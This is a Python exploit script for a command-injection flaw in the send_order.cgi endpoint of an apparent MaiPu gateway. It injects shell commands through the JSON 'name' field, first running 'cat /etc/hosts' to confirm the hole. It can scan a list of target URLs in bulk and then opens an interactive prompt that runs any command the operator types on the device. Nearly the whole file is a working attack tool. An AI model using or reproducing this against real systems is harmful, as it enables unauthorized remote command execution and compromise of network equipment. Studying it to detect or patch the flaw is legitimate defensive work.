import requests
import urllib3
import re
from urllib.parse import urljoin,quote
import argparse
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls


def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/send_order.cgi?parameter=operation")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = """{"opid":"1","name":";echo -n klmns:;cat /etc/hosts;","type":"rest"}"""
    try:
        response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
        result = response.headers['klmns']
        if response.status_code == 200 and '127.0.0.1' in result and 'localhost' in result:
                print(f"\033[31mDiscovered:{url}: MaiPuGateway_sendorder_RCE!\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = urljoin(url, "/send_order.cgi?parameter=operation")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            if "exit" not in command:
                # command = quote(quote(command))
                data = """{"opid":"1","name":";echo -n klmns:;%s;","type":"rest"}"""%(command)
                try:
                    response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
                    result = response.headers['klmns']
                    if response.status_code == 200:
                            print(result)
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")